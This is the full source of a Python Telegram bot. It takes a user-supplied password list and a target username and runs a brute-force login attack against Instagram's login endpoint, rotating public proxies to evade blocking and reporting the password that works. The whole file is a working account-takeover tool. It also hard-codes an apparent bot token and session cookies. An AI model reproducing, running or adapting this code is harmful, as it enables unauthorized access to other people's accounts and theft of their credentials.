import telebot
import requests,random
import json,uuid
from user_agent import generate_user_agent
from telebot import types

TOKEN = '6592043257:AAHFfI4C3OYMuMTQX5oVqKkcBt03DHP4QJ4'

bot = telebot.TeleBot(TOKEN)

bot.set_my_commands([telebot.types.BotCommand("/start", "🤖 Start the bot"),telebot.types.BotCommand("/help", "🆘 How to use the bot")])

@bot.message_handler(commands=['help'])
def send_welcome(message):
    bot.reply_to(message, "<b>Devel : @PY_87</b>",parse_mode='HTML')



@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "<b>Send Your Lista Password</b>",parse_mode='HTML')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    
    if message.document.mime_type == 'text/plain':
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        passwords = downloaded_file.decode('utf-8').splitlines()

        bot.reply_to(message, "<b>Enter Your username Target</b>",parse_mode='HTML')
        bot.register_next_step_handler(message, process_email, passwords)

def process_email(message, passwords):
    username = message.text
    for password in passwords:
        nk = ['157.245.34.18:80','161.35.172.164:80','36.94.48.188:2021','43.225.186.20:80','118.99.103.153:80','111.67.75.109:8181','87.117.38.10:3128','175.106.17.62:57406','3.10.255.67:80','206.189.114.127:80','159.65.51.134:80','178.128.160.79:80','3.11.250.248:80','178.128.45.83:80','142.93.40.67:80','178.128.166.136:80']
        nn = random.choice(nk)
        url = 'https://www.instagram.com/accounts/login/ajax/'
        
        headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}
         
        data = {
'username': username,
'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
'queryParams':'{}',
'optIntoOneTap':'false'}

        proxies = {'http': 'https://{nn}',
        
        }

        r = requests.post(url, headers=headers, data=data,proxies=proxies).json()
        if 'userId' in r:
            bot.reply_to(message, f'☑️Good Instagram Info {username} : {password}')
            exit(0)
        else:
            bot.reply_to(message, f'<b>🔴Bad Instagram\n___________________________\n{username} : {password}\n\nProxie : {nn}</b>',parse_mode='HTML')
            

bot.polling()
